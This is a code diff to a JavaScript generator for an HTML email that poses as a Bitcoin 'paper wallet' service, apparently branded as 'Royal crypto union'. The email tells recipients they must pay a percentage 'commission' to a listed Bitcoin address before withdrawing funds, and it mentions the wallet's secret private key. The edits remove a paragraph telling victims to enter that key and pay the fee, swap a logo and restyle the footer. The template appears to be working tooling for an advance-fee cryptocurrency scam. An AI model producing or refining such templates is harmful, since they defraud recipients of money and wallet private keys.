@@ -9,6 +9,7 @@ function generateHTML(
   domainLink,
   precent
 ) {
+
   const output = `<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
     <html xmlns="http://www.w3.org/1999/xhtml">
     <head>
@@ -64,7 +65,6 @@ function generateHTML(
           <tr style="margin:0;padding:0;box-sizing:border-box">
             <td style="margin:0;padding:20px;box-sizing:border-box;text-align:center">
               <p style="margin:0 0 20px;padding:0;box-sizing:border-box;color:#677788;font-size:16px">To withdraw funds from paper wallet you must pay a ${precent}% commission of the current amount on the Bitcoin wallet.<br style="margin:0;padding:0;box-sizing:border-box">IMPORTANT! The secret Private key can be used only once,after that it will not be valid.</p>
-              <p style="margin:0 0 20px;padding:0;box-sizing:border-box;color:#677788;font-size:16px">First, enter Private key from your printed BTC paper wallet and enter your own email address.To pay the commission,use a digital Bitcoin wallet,scan QR code,send the correct amount of the Bitcoin indicated in the form on website,double-check the Bitcoin address into which you need to pay commission.Once the ${precent}% commission fee has been paid ,click the button CONFIRM TRANSFER</p>
             </td>
           </tr>
           <tr style="margin:0;padding:0;box-sizing:border-box">
@@ -84,7 +84,7 @@ function generateHTML(
                     <p style="margin:0 0 5px;padding:0;box-sizing:border-box;display:block">Bitcoin address to pay a commission fee</p>
                     <p style="margin:0;padding:0;box-sizing:border-box;display:block;font-weight:bold;font-size:16px;word-break:break-all">${bitcoin_address}</p>
                   </div>
-                  <img src="${domainLink}/img/bitcoin-logo.png" style="margin:0 0 0 auto;padding:0;box-sizing:border-box;width:40px;height:auto;display:block" class="CToWUd" data-bit="iit">
+                  <img src="${domainLink}/img/black-bi.jpg" style="margin:0 0 0 auto;padding:0;box-sizing:border-box;width:40px;height:auto;display:block" class="CToWUd" data-bit="iit">
                 </div>
               </div>
             </td>
@@ -105,11 +105,11 @@ function generateHTML(
                   <img src="${domainLink}/img/ethereum.gif" alt="Royal crypto union" style="margin:0;padding:0;box-sizing:border-box;width:70px;height:auto;margin-right:2px;display:inline-block;vertical-align:top" class="CToWUd" data-bit="iit">
                 </figure>
                 <span style="margin:0;padding:15px 0 0;box-sizing:border-box;display:inline-block;font-weight:bold;font-size:14px;vertical-align:top">
-                  <span style="margin:0;padding:0;box-sizing:border-box;display:block;color:#000">${domainFooter} wallet</span>
+                  <span style="margin:0;padding:0;box-sizing:border-box;display:block;color:#000;text-align: center;">${domainFooter}<span style="color:gray;" >.com</span></span>
                   <span style="margin:0;padding:0;box-sizing:border-box;display:block;font-size:72%;color:#ccc">Print your coins secure offline</span>
                 </span>
               </a>
-              <p style="margin:0 0 4px;padding:0;box-sizing:border-box;font-size:12px;text-align:center">We're proud to be part of the <a href="${domainLink}" style="margin:0;padding:0;box-sizing:border-box;color:#0052ea;text-decoration:none" target="_blank" data-saferedirecturl="https://www.google.com/url?q=https://royalcoinunion.com/&amp;source=gmail&amp;ust=1675970878006000&amp;usg=AOvVaw2FKJ4CW1IyoKWY9W3YD8zK"><b style="margin:0;padding:0;box-sizing:border-box">2% for impact</b></a> family.</p>
+              <p style="margin:0 0 4px;padding:0;box-sizing:border-box;font-size:12px;text-align:center">We're proud to be part of the <b style="margin:0;padding:0;box-sizing:border-box">2% for impact</b> family.</p>
               <p style="margin:0 0 4px;padding:0;box-sizing:border-box;font-size:12px;text-align:center">© ${domainFooter} 2018. All rights reserved.</p>
             </td>
           </tr>
